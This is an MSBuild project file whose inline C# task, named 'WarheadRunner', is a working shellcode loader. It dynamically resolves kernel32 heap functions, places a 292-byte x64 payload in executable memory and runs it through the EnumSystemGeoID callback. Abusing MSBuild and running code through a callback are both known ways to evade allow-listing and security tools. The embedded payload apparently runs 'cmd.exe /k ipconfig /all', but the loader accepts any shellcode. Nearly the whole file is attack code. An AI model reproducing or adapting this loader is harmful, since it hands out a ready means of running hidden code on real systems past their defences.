<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="ExecuteWarhead">
<WarheadRunner />
</Target>

<UsingTask
TaskName="WarheadRunner"
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
<Task>
<Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;

public class WarheadRunner : Microsoft.Build.Utilities.Task
{
    public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
    {
        var assemblyName = new AssemblyName("DynamicAssembly");
        var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

        var methodBuilder = moduleBuilder.DefinePInvokeMethod(
            methodName,
            library,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
            CallingConventions.Standard,
            returnType,
            parameterTypes,
            CallingConvention.Winapi,
            CharSet.Ansi
        );

        methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
        moduleBuilder.CreateGlobalFunctions();
        MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

        return dynamicMethod.Invoke(null, argumentTypes);
    }

    public static IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize)
    {
        var parameterTypes = new Type[] { typeof(uint), typeof(UIntPtr), typeof(UIntPtr) };
        var arguments = new object[] { flOptions, dwInitialSize, dwMaximumSize };

        return (IntPtr)DynamicInvoke(typeof(IntPtr), "kernel32.dll", "HeapCreate", arguments, parameterTypes);
    }

    public static IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(UIntPtr) };
        var arguments = new object[] { hHeap, dwFlags, dwBytes };

        return (IntPtr)DynamicInvoke(typeof(IntPtr), "kernel32.dll", "HeapAlloc", arguments, parameterTypes);
    }

    public static bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(IntPtr) };
        var arguments = new object[] { hHeap, dwFlags, lpMem };

        return (bool)DynamicInvoke(typeof(bool), "kernel32.dll", "HeapFree", arguments, parameterTypes);
    }

    public static bool EnumSystemGeoID(int GeoClass, int ParentGeoId, IntPtr lpGeoEnumProc)
    {
        var parameterTypes = new Type[] { typeof(int), typeof(int), typeof(IntPtr) };
        var arguments = new object[] { GeoClass, ParentGeoId, lpGeoEnumProc };

        return (bool)DynamicInvoke(typeof(bool), "kernel32.dll", "EnumSystemGeoID", arguments, parameterTypes);
    }

    public override bool Execute()
    {
        byte[] Warhead = new byte[292] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8,
            0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48,
            0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
            0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
            0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
            0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41,
            0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,
            0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
            0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0,
            0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6,
            0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
            0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
            0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
            0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0,
            0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
            0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
            0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
            0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba,
            0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41,
            0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c,
            0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72,
            0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64,
            0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x6b, 0x20, 0x69, 0x70, 0x63, 0x6f,
            0x6e, 0x66, 0x69, 0x67, 0x20, 0x2f, 0x61, 0x6c, 0x6c, 0x00 };
        IntPtr heapHandle = HeapCreate(0x00040000, (UIntPtr)0x1000, UIntPtr.Zero);
        IntPtr address = HeapAlloc(heapHandle, 0x00000008, (UIntPtr)Warhead.Length);
        Marshal.Copy(Warhead, 0, address, Warhead.Length);
        EnumSystemGeoID(0, 0, address);
        HeapFree(heapHandle, 0, address);

        return true;
    }
}
]]>
</Code>
</Task>
</UsingTask>
</Project>
